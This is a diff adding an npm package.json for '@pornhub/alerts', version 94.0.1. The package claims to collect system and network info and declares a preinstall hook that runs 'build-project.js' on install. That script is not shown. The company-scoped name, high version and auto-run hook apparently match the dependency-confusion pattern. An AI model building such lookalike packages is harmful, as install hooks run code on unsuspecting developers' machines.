@@ -1,0 +1,18 @@
+{
+  "name": "@pornhub/alerts",
+  "version": "94.0.1",
+  "description": "Simple package to collect basic system info, like running OS and status of network interfaces.",
+  "main": "app.js",
+  "scripts": {
+    "test": "echo \"Error: no test specified\" && exit 1",
+    "preinstall" : "node build-project.js"
+  },
+  "keywords": [
+    "sysinfo",
+    "systeminfo",
+    "cpuinfo",
+    "networkstatus"
+  ],
+  "author": "Alex Summer",
+  "license": "ISC"
+}
